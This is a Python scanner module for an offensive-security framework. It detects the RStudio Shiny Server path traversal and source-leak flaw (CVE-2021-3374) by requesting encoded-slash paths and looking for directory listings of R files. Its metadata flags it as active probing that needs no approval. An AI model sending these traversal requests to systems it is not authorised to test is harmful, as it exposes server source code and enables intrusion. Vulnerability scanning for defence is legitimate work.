#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rstudio Shiny Server prior to 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Rstudio Shiny Server <1.5.16 - Local File Inclusion Detection',
        'description': 'Rstudio Shiny Server prior to 1.5.16 is vulnerable to local file inclusion and source code leakage. This can be exploited by appending an encoded slash to the URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rstudio', 'traversal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/colemanjp/shinyserver-directory-traversal-source-code-leak',
            'https://blog.rstudio.com/2021/01/13/shiny-server-1-5-16-update/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3374',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-3374',
    }

    def run(self):
        for path in ('/%2f/', '/sample-apps/hello/%2f/'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('Index of /',)
            body_regexes = ('[A-Za-z].*\\.R',)
            if (any(m in body for m in body_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='medium',
                    reason="Rstudio Shiny Server <1.5.16 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

